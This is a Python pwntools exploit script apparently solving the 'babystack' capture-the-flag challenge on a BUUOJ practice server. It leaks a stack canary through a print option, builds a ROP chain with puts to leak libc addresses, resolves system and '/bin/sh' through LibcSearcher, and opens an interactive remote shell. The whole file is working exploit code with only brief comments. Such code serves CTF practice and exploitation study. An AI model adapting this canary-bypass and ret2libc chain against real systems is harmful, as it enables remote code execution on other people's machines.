from pwn import *
from LibcSearcher import LibcSearcher
context(os='linux',arch='amd64')
context.log_level='DEBUG'

# leak canary by option print
# and pass the canary leak thelibc by rop attack
# get shell by rop attcak finally

# p = process('./babystack')
p = remote('node3.buuoj.cn',28802)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

# leak canary
ru(">> ")
s(1)
s('A'*(0x90-0x8) + 'B')
ru(">> ")
s(2)
ru('B')
canary = u64('\x00'+r(7))
leak('canary',canary)

# leak puts_addr by rop attack
elf = ELF('./babystack',checksec=False)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x0000000000400908
pop_rdi = 0x0000000000400a93 # pop rdi ; ret
ru(">> ")
s(1)
payload = 'A'*(0x90-0x8) + p64(canary) + 'B'*8
payload += flat([pop_rdi, puts_got, puts_plt, main])
s(payload)
ru(">> ")
s(3)
puts_addr = u64(ru('\n').ljust(8,'\x00'))
leak("puts",puts_addr)

# calculate the libc addr
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
leak('system',system_addr)
binsh = libc_base + libc.dump('str_bin_sh')
leak('binsh',binsh)

# get shell by rop chain
ru(">> ")
s(1)
payload = 'A'*(0x90-0x8) + p64(canary) + 'B'*8
payload += flat([pop_rdi, binsh, system_addr, main])
s(payload)
ru(">> ")
s(3)
sleep(0.1)
itr()
